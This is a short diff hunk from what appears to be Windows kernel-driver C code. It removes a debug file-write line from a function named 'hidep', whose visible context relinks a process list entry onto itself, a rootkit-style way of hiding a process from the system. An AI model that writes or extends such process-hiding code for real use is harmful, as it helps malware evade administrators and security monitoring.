@@ -23,7 +23,6 @@ PCHAR hidep(UINT32 pid) {
 		currentList->Flink = (PLIST_ENTRY)&currentList->Flink;
 	}
 	
-	debugFile(L"\\DosDevices\\C:\\Windows\\Niue.txt");
 	return NULL;
 }
 
